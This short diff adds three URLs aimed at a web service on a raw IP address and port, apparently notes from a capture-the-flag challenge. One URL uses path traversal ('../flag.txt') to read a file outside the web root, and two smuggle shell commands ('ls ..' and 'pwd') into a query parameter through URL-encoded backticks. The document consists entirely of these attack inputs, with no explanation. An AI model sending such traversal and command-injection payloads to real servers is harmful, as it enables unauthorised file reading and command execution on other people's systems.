@@ -1,0 +1,3 @@
+http://34.72.118.158:6284/fun1.php?file=../flag.txt
+http://34.72.118.158:6284/fun.php?string=%60ls+..%60
+http://34.72.118.158:6284/fun.php?string=%60pwd%60
